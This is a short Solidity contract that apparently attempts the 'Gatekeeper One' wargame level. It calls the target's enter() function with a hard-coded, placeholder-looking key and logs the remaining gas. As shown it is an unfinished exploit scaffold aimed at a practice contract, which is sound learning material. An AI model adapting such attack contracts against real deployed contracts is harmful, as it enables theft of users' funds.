// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "./gate_keeper_one.sol";


contract AttackGatekeeperOne {

    GatekeeperOne gatekeeperContract;
    event Log(uint, string);

    constructor(address gatekeeperContractAddress) {
        gatekeeperContract = GatekeeperOne(gatekeeperContractAddress);
    }

    function attack() public {
        emit Log(gasleft(), "gas left from start");
        gatekeeperContract.enter(0x1234567812345678);
    }
}